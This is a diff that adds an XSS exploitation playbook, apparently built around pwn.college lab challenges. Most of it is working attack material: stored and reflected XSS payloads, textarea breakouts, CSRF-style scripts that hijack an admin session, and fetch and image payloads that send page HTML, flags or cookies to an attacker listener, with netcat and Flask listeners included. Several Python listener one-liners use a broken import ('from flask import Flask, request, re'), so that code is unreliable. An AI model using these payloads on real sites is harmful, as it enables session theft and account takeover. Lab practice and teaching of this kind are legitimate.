@@ -3127,4 +3127,792 @@ This playbook is for educational purposes only. Use responsibly and only on syst
 
 ---
 
+# 🚀 Cross-Site Scripting (XSS) Exploitation Playbook
+
+A comprehensive guide covering Stored XSS, Reflected XSS, XSS in different contexts, and advanced exploitation techniques.
+
+---
+
+## Table of Contents
+- [1. Introduction to XSS](#1-introduction-to-xss)
+- [2. Stored XSS - Basic Injection](#2-stored-xss---basic-injection)
+- [3. Stored XSS - JavaScript Injection](#3-stored-xss---javascript-injection)
+- [4. Reflected XSS in Page Body](#4-reflected-xss-in-page-body)
+- [5. Breaking Out of Textarea Context](#5-breaking-out-of-textarea-context)
+- [6. Stored XSS with CSRF (xss5)](#6-stored-xss-with-csrf-xss5)
+- [7. Stored XSS with POST CSRF (xss6)](#7-stored-xss-with-post-csrf-xss6)
+- [8. Stored XSS - Stealing Admin Cookies (xss7)](#8-stored-xss---stealing-admin-cookies-xss7)
+- [9. XSS Payload Reference](#9-xss-payload-reference)
+- [10. Debugging XSS](#10-debugging-xss)
+- [11. Prevention & Best Practices](#11-prevention--best-practices)
+
+---
+
+## 1. Introduction to XSS
+
+Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious scripts into web pages viewed by other users.
+
+### Types of XSS
+
+| Type | Description | Example |
+|------|-------------|---------|
+| **Stored XSS** | Payload stored on server (database) | Forum posts, comments |
+| **Reflected XSS** | Payload reflected in response | Search results, error messages |
+| **DOM-based XSS** | Payload executed in DOM | Client-side JavaScript |
+
+---
+
+## 2. Stored XSS - Basic Injection
+
+### Challenge: Inject HTML to Create Textboxes
+
+**Goal:** Inject HTML textboxes so the victim sees 3 total textboxes.
+
+**Vulnerable Code:**
+```python
+@app.route("/", methods=["POST"])
+def challenge_post():
+    content = flask.request.form.get("content", "")
+    db.execute("INSERT INTO posts VALUES (?)", [content])
+    return flask.redirect(flask.request.path)
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost...\n"
+    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"
+    
+    for post in db.execute("SELECT content FROM posts").fetchall():
+        page += "<hr>" + post["content"] + "\n"  # 💀 UNSAFE - No escaping!
+    
+    return page + "</body></html>"
+```
+
+**The Problem:** User input is directly concatenated into HTML without sanitization.
+
+### Exploitation Commands
+
+```bash
+# Post the XSS payload (injects 2 textboxes)
+curl -X POST "http://challenge.localhost:80/" \
+  -d "content=<input type='text'><input type='text'>"
+
+# Verify the injection
+curl "http://challenge.localhost:80/" | grep -o "<input" | wc -l
+
+# Trigger the victim
+/challenge/victim "http://challenge.localhost:80/"
+```
+
+### Complete One-Liner
+
+```bash
+curl -X POST "http://challenge.localhost:80/" -d "content=<input type='text'><input type='text'>" && \
+/challenge/victim "http://challenge.localhost:80/"
+```
+
+---
+
+## 3. Stored XSS - JavaScript Injection
+
+### Challenge: Inject JavaScript to Trigger Alert
+
+**Goal:** Inject a JavaScript payload that executes `alert(1)`.
+
+### Exploitation Commands
+
+```bash
+# Post JavaScript payload
+curl -X POST "http://challenge.localhost:80/" \
+  -d 'content="><script>alert(1)</script>'
+
+# Trigger the victim
+/challenge/victim "http://challenge.localhost:80/"
+```
+
+### Complete One-Liner
+
+```bash
+curl -X POST "http://challenge.localhost:80/" -d 'content="><script>alert(1)</script>' && \
+/challenge/victim "http://challenge.localhost:80/"
+```
+
+---
+
+## 4. Reflected XSS in Page Body
+
+### Challenge: Reflected XSS in URL Parameter
+
+**Goal:** Trigger an alert by reflecting JavaScript in the page body.
+
+**Vulnerable Code:**
+```python
+@app.route("/", methods=["GET"])
+def challenge_get():
+    return f"""
+        <html><body>
+        <h1>pwnmsg ephemeral message service</h1>
+        The message:
+        <form>
+            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
+            <input type=submit value="Make URL!">
+        </form>
+        </body></html>
+    """
+```
+
+### Exploitation Commands
+
+```bash
+# Direct URL with payload
+curl "http://challenge.localhost:80/?msg=<script>alert(1)</script>"
+
+# Trigger the victim
+/challenge/victim "http://challenge.localhost:80/?msg=<script>alert(1)</script>"
+```
+
+### URL Encoded Version
+
+```bash
+/challenge/victim "http://challenge.localhost:80/?msg=%3Cscript%3Ealert(1)%3C/script%3E"
+```
+
+---
+
+## 5. Breaking Out of Textarea Context
+
+### Challenge: XSS Inside a Textarea Tag
+
+**Goal:** Break out of the textarea context and trigger `alert("PWNED")`.
+
+**Vulnerable Code:**
+```python
+@app.route("/", methods=["GET"])
+def challenge_get():
+    return f"""
+        <html><body>
+        <h1>pwnmsg ephemeral message service</h1>
+        The message:
+        <form>
+            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
+            <input type=submit value="Make URL!">
+        </form>
+        </body></html>
+    """
+```
+
+### Understanding the Context
+
+Current HTML:
+```html
+<textarea name=msg>USER_INPUT_HERE</textarea>
+```
+
+To execute JavaScript, we need to **close the textarea** first.
+
+### Exploitation Commands
+
+```bash
+# Break out of textarea and inject script
+curl "http://challenge.localhost:80/?msg=</textarea><script>alert('PWNED')</script>"
+
+# With dummy textarea to maintain structure
+curl "http://challenge.localhost:80/?msg=</textarea><script>alert('PWNED')</script><textarea>"
+
+# Trigger victim
+/challenge/victim "http://challenge.localhost:80/?msg=</textarea><script>alert('PWNED')</script>"
+```
+
+### Alternative Payloads
+
+```bash
+# Using img onerror
+/challenge/victim "http://challenge.localhost:80/?msg=</textarea><img src=x onerror=alert('PWNED')>"
+
+# Using body onload
+/challenge/victim "http://challenge.localhost:80/?msg=</textarea><body onload=alert('PWNED')>"
+
+# Using svg onload
+/challenge/victim "http://challenge.localhost:80/?msg=</textarea><svg onload=alert('PWNED')>"
+```
+
+### URL Encoded Version
+
+```bash
+/challenge/victim "http://challenge.localhost:80/?msg=%3C/textarea%3E%3Cscript%3Ealert('PWNED')%3C/script%3E"
+```
+
+---
+
+## 6. Stored XSS with CSRF (xss5)
+
+### Challenge: Use XSS to Publish Admin's Draft
+
+**Goal:** The admin has a draft with the flag. Use XSS to make the admin publish their draft.
+
+**Vulnerable Code:**
+```python
+# The admin's draft contains the flag
+db.execute("""INSERT INTO users SELECT "admin" as username, ? as password""", [open("/flag").read()])
+
+# Admin cannot post, but can publish drafts
+# GET /publish - publishes the admin's draft
+```
+
+### Exploitation Commands
+
+```bash
+# Terminal 1: Start listener (optional, for exfiltration)
+nc -l -v -p 1337
+
+# Terminal 2: Run exploit
+curl -c cookie.txt -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" && \
+curl -b cookie.txt -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("/publish");</script>&publish=on' && \
+/challenge/victim && \
+curl -b cookie.txt http://challenge.localhost:80/ | grep -o "pwn.college{[^}]*}"
+```
+
+### Complete One-Liner
+
+```bash
+curl -c cookie.txt -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" && \
+curl -b cookie.txt -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("/publish");</script>&publish=on' && \
+/challenge/victim && \
+curl -b cookie.txt http://challenge.localhost:80/ | grep -o "pwn.college{[^}]*}"
+```
+
+### Understanding `&publish=on`
+
+The `&publish=on` is **form data** that simulates checking the "Publish" checkbox:
+
+```html
+<form action=draft method=post>
+  <textarea name=content>Write something!</textarea>
+  <input type=checkbox name=publish>Publish  ← This sends publish=on when checked
+  <input type=submit value=Save>
+</form>
+```
+
+---
+
+## 7. Stored XSS with POST CSRF (xss6)
+
+### Challenge: Admin Draft with POST to /publish
+
+**Goal:** The admin's draft contains the flag, but `/publish` requires POST method.
+
+### Exploitation Commands
+
+```bash
+# Terminal 1: Start Python listener
+python3 -c '
+from flask import Flask, request
+import re
+app = Flask(__name__)
+
+@app.route("/", methods=["POST"])
+def receive():
+    data = request.data.decode()
+    flag = re.search(r"pwn\.college\{[^}]+\}", data)
+    if flag:
+        print(f"\n[+] FLAG: {flag.group(0)}\n")
+    return "OK"
+
+print("[*] Listening on port 1337...")
+app.run(host="0.0.0.0", port=1337)
+'
+
+# Terminal 2: Run exploit
+curl -c cookie.txt -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" && \
+curl -b cookie.txt -X POST http://challenge.localhost:80/draft -d 'content=<script>
+fetch("/publish", {method: "POST"})
+  .then(() => fetch("/"))
+  .then(r => r.text())
+  .then(html => {
+    const flagMatch = html.match(/pwn\.college\{[^}]+\}/);
+    if (flagMatch) {
+      fetch("http://localhost:1337/", {
+        method: "POST",
+        body: flagMatch[0]
+      });
+    }
+  });
+</script>&publish=on' && \
+/challenge/victim
+```
+
+### Complete One-Liner (with netcat)
+
+```bash
+# Terminal 1: Netcat listener
+nc -l -v -p 1337
+
+# Terminal 2: Exploit
+curl -c cookie.txt -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" && \
+curl -b cookie.txt -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("/publish",{method:"POST"}).then(()=>fetch("/")).then(r=>r.text()).then(html=>{const f=html.match(/pwn\.college\{[^}]+\}/);if(f)fetch("http://localhost:1337/",{method:"POST",body:f[0]});});</script>&publish=on' && \
+/challenge/victim
+```
+
+### Why This Works
+
+1. **XSS executes as admin** → admin's session cookie sent automatically
+2. **`fetch("/publish", {method:"POST"})`** → publishes admin's draft
+3. **`fetch("/")`** → gets the homepage with the published flag
+4. **Regex extracts flag** → even if only 12 chars are displayed, the full flag is in HTML
+5. **Exfiltration** → sends full flag to your listener
+
+---
+
+## 8. Stored XSS - Stealing Admin Cookies (xss7)
+
+### Challenge: Steal Admin's Authentication Cookie
+
+**Goal:** The admin cannot publish drafts. Use XSS to steal the admin's cookie and impersonate them.
+
+**Key Differences from xss5/xss6:**
+
+| Feature | xss5/xss6 | xss7 |
+|---------|-----------|------|
+| Authentication | Flask session | Cookie-based: `auth=username\|password` |
+| Admin Restriction | Can publish drafts | **Cannot post or publish** |
+| Goal | Publish admin's draft | **Steal admin's cookie** |
+| Cookie Access | Not needed | HttpOnly cookie |
+
+### Exploitation Commands
+
+#### Method 1: Exfiltrate HTML Page (Works Best)
+
+Since `document.cookie` is HttpOnly, fetch the page as admin and exfiltrate the HTML:
+
+```bash
+# Terminal 1: Python listener
+python3 -c '
+from flask import Flask, request
+import re
+app = Flask(__name__)
+
+@app.route("/", methods=["POST"])
+def receive():
+    data = request.data.decode()
+    flag = re.search(r"pwn\.college\{[^}]+\}", data)
+    if flag:
+        print(f"\n[+] FLAG: {flag.group(0)}\n")
+    else:
+        # Try to find auth cookie
+        auth = re.search(r"auth=([^;]+)", data)
+        if auth:
+            print(f"[+] AUTH COOKIE: {auth.group(0)}")
+    return "OK"
+
+print("[*] Listening on port 1337...")
+app.run(host="0.0.0.0", port=1337)
+'
+
+# Terminal 2: Run exploit
+curl -c cookie.txt -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" && \
+curl -b cookie.txt -X POST http://challenge.localhost:80/draft -d 'content=<script>
+fetch("/")
+  .then(r => r.text())
+  .then(html => {
+    fetch("http://localhost:1337/", {
+      method: "POST",
+      body: html
+    });
+  });
+</script>&publish=on' && \
+/challenge/victim
+```
+
+#### Method 2: Exfiltrate Draft Page Directly
+
+```bash
+curl -b cookie.txt -X POST http://challenge.localhost:80/draft \
+  -d 'content=<script>
+fetch("/draft")
+  .then(r => r.text())
+  .then(html => {
+    fetch("http://localhost:1337/", {
+      method: "POST",
+      body: html
+    });
+  });
+</script>&publish=on'
+```
+
+#### Method 3: Use the Stolen Cookie to View Admin's Draft
+
+```bash
+# After capturing the auth cookie from your listener
+# Use it to impersonate the admin
+curl --cookie "auth=admin|RT.dJDO1YDL4cjM1gzW}" \
+  "http://challenge.localhost:80/"
+```
+
+### Complete One-Liner with Python Listener
+
+```bash
+# Run this in one terminal (listener will run in background)
+python3 -c '
+from flask import Flask, request, re
+app = Flask(__name__)
+@app.route("/", methods=["POST"])
+def r():
+    d = request.data.decode()
+    f = re.search(r"pwn\.college\{[^}]+\}", d)
+    if f:
+        print(f"\n[+] FLAG: {f.group(0)}\n")
+    else:
+        a = re.search(r"auth=([^;]+)", d)
+        if a:
+            print(f"[+] AUTH: {a.group(0)}")
+    return "OK"
+app.run(host="0.0.0.0", port=1337)
+' &
+sleep 2
+
+curl -c cookie.txt -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" && \
+curl -b cookie.txt -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("/").then(r=>r.text()).then(html=>{fetch("http://localhost:1337/",{method:"POST",body:html});});</script>&publish=on' && \
+/challenge/victim
+```
+
+### Why `document.cookie` Doesn't Work
+
+```javascript
+// ❌ This doesn't work because the cookie is HttpOnly
+fetch("http://localhost:1337/", {
+  method: "POST",
+  body: document.cookie  // Returns empty string!
+})
+```
+
+**Solution:** Use `fetch("/")` to get the page as the admin, which automatically sends the cookie.
+
+---
+
+## 9. XSS Payload Reference
+
+### Basic Payloads
+
+```html
+<!-- Simple script -->
+<script>alert(1)</script>
+
+<!-- Script with content -->
+<script>alert("XSS")</script>
+
+<!-- Script with single quotes -->
+<script>alert('XSS')</script>
+
+<!-- No quotes -->
+<script>alert(/XSS/)</script>
+```
+
+### HTML Injection Payloads
+
+```html
+<!-- Inject textbox -->
+<input type="text">
+
+<!-- Inject multiple textboxes -->
+<input type="text"><input type="text">
+
+<!-- Inject form -->
+<form><input type="text"></form>
+
+<!-- Inject button -->
+<button onclick="alert(1)">Click me</button>
+```
+
+### Event Handler Payloads
+
+```html
+<!-- Image onerror -->
+<img src=x onerror="alert(1)">
+
+<!-- Body onload -->
+<body onload="alert(1)">
+
+<!-- SVG onload -->
+<svg onload="alert(1)">
+
+<!-- Details ontoggle -->
+<details ontoggle="alert(1)">
+
+<!-- Input onfocus -->
+<input onfocus="alert(1)" autofocus>
+```
+
+### Breaking Out of Contexts
+
+```html
+<!-- Break out of textarea -->
+</textarea><script>alert(1)</script>
+
+<!-- Break out of quotes -->
+"><script>alert(1)</script>
+
+<!-- Break out of tags -->
+</tag><script>alert(1)</script>
+
+<!-- Comment out rest -->
+<script>alert(1)</script> <!--
+```
+
+### Exfiltration Payloads
+
+```javascript
+// Send to listener with fetch
+fetch("http://localhost:1337/", {
+  method: "POST",
+  body: document.cookie
+});
+
+// Send as image
+var img = new Image();
+img.src = "http://localhost:1337/?cookie=" + document.cookie;
+
+// Send entire page
+fetch("/")
+  .then(r => r.text())
+  .then(html => {
+    fetch("http://localhost:1337/", {
+      method: "POST",
+      body: html
+    });
+  });
+
+// Publish admin's draft
+fetch("/publish", {method: "POST"});
+
+// Publish and exfiltrate flag
+fetch("/publish", {method: "POST"})
+  .then(() => fetch("/"))
+  .then(r => r.text())
+  .then(html => {
+    const flag = html.match(/pwn\.college\{[^}]+\}/);
+    if (flag) {
+      fetch("http://localhost:1337/", {
+        method: "POST",
+        body: flag[0]
+      });
+    }
+  });
+```
+
+### Common Flag Patterns
+
+```javascript
+// Match different flag formats
+/pwn\.college\{[^}]+\}/
+/flag\{[^}]+\}/
+/picoCTF\{[^}]+\}/
+/FLAG\{[^}]+\}/
+```
+
+---
+
+## 10. Debugging XSS
+
+### View Source vs Inspect Element
+
+| Tool | Shows | Use Case |
+|------|-------|----------|
+| **View Source** | Raw HTML from server | Check if payload was injected |
+| **Inspect Element** | Rendered DOM | Check if payload executed |
+
+### Debug Commands
+
+```bash
+# View the raw HTML source
+curl -s "http://challenge.localhost:80/" | cat -A
+
+# Check if payload is injected
+curl -s "http://challenge.localhost:80/" | grep -i "script"
+
+# Count injected elements
+curl -s "http://challenge.localhost:80/" | grep -o "<input" | wc -l
+
+# Save page for analysis
+curl -s "http://challenge.localhost:80/" > page.html
+```
+
+### JavaScript Console Debugging
+
+```javascript
+// Add console.log for debugging
+<script>
+console.log("XSS executing!");
+fetch("/publish", {method: "POST"})
+  .then(() => {
+    console.log("Published!");
+    return fetch("/");
+  })
+  .then(r => r.text())
+  .then(html => {
+    console.log("Page fetched!");
+    const flag = html.match(/pwn\.college\{[^}]+\}/);
+    console.log("Flag:", flag);
+  });
+</script>
+```
+
+### Common Issues and Solutions
+
+| Issue | Solution |
+|-------|----------|
+| **Payload not executing** | Check View Source to see if injected |
+| **Script tags removed** | Try `<img onerror>` or `<svg onload>` |
+| **Quotes escaped** | Use backticks or no quotes |
+| **`document.cookie` empty** | Use `fetch("/")` to get page HTML |
+| **Fetch blocked** | Use `<img src=` for exfiltration |
+| **Invalid HTML** | Check View Source for broken tags |
+
+### Testing XSS with curl
+
+```bash
+# Test if injection works (should see your payload in response)
+curl -s "http://challenge.localhost:80/?msg=test123" | grep "test123"
+
+# Test if script is executed (check response for changes)
+curl -s "http://challenge.localhost:80/?msg=<script>alert(1)</script>"
+
+# Test with debugging payload
+curl -s "http://challenge.localhost:80/?msg=<script>console.log('XSS')</script>"
+```
+
+---
+
+## 11. Prevention & Best Practices
+
+### Input Sanitization
+
+```python
+import html
+
+# Escape HTML characters
+safe_content = html.escape(user_input)
+db.execute("INSERT INTO posts VALUES (?)", [safe_content])
+```
+
+### Using Template Engines
+
+```python
+from flask import render_template_string
+
+# Template engine auto-escapes
+@app.route("/")
+def index():
+    posts = db.execute("SELECT content FROM posts").fetchall()
+    return render_template_string("""
+        {% for post in posts %}
+        <hr>{{ post.content }}
+        {% endfor %}
+    """, posts=posts)
+```
+
+### Content Security Policy (CSP)
+
+```python
+@app.after_request
+def add_security_headers(response):
+    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'none'"
+    return response
+```
+
+### HttpOnly Cookies
+
+```python
+# Set HttpOnly flag on cookies
+response.set_cookie('session', value, httponly=True)
+```
+
+### Input Validation
+
+```python
+# Whitelist approach
+allowed_tags = ['p', 'br', 'strong']
+if user_input in allowed_tags:
+    # Process input
+    pass
+```
+
+### XSS Prevention Checklist
+
+- [ ] Escape all user input before rendering
+- [ ] Use template engines with auto-escaping
+- [ ] Set HttpOnly flag on cookies
+- [ ] Implement Content Security Policy
+- [ ] Validate and sanitize input
+- [ ] Use parameterized queries for SQL
+- [ ] Avoid `innerHTML` with user input
+- [ ] Use `textContent` instead of `innerHTML`
+
+---
+
+## Quick Reference Card
+
+### XSS Payload Quick Reference
+
+| Context | Payload | Notes |
+|---------|---------|-------|
+| **HTML Body** | `<script>alert(1)</script>` | Basic injection |
+| **Textarea** | `</textarea><script>alert(1)</script>` | Break out first |
+| **HTML Attribute** | `"><script>alert(1)</script>` | Break out of quotes |
+| **URL Parameter** | `?msg=<script>alert(1)</script>` | Reflected XSS |
+| **Stored** | Post to database | Persistent XSS |
+
+### Command Quick Reference
+
+```bash
+# Stored XSS (HTML injection)
+curl -X POST "http://challenge.localhost:80/" -d "content=<input type='text'>"
+
+# Stored XSS (JavaScript)
+curl -X POST "http://challenge.localhost:80/" -d 'content="><script>alert(1)</script>'
+
+# Reflected XSS
+curl "http://challenge.localhost:80/?msg=<script>alert(1)</script>"
+
+# Textarea breakout
+curl "http://challenge.localhost:80/?msg=</textarea><script>alert(1)</script>"
+
+# xss5 - GET publish
+curl -c cookie.txt -X POST .../login -d "username=hacker&password=1337" && \
+curl -b cookie.txt -X POST .../draft -d 'content=<script>fetch("/publish");</script>&publish=on'
+
+# xss6 - POST publish + exfiltrate
+curl -b cookie.txt -X POST .../draft -d 'content=<script>fetch("/publish",{method:"POST"}).then(()=>fetch("/")).then(r=>r.text()).then(html=>{const f=html.match(/pwn\.college\{[^}]+\}/);if(f)fetch("http://localhost:1337/",{method:"POST",body:f[0]});});</script>&publish=on'
+
+# xss7 - Exfiltrate page HTML
+curl -b cookie.txt -X POST .../draft -d 'content=<script>fetch("/").then(r=>r.text()).then(html=>{fetch("http://localhost:1337/",{method:"POST",body:html});});</script>&publish=on'
+```
+
+### Listener Quick Reference
+
+```bash
+# Netcat listener
+nc -l -v -p 1337
+
+# Python listener (extracts flag)
+python3 -c '
+from flask import Flask, request, re
+app = Flask(__name__)
+@app.route("/", methods=["POST"])
+def r():
+    d = request.data.decode()
+    f = re.search(r"pwn\.college\{[^}]+\}", d)
+    if f: print(f"\n[+] FLAG: {f.group(0)}\n")
+    return "OK"
+app.run(host="0.0.0.0", port=1337)
+'
+```
+
+---
+
+## License
+
+This playbook is for educational purposes only. Use responsibly and only on systems you have permission to test.
+
+---
+
 **Happy Hacking! 🚀**
+
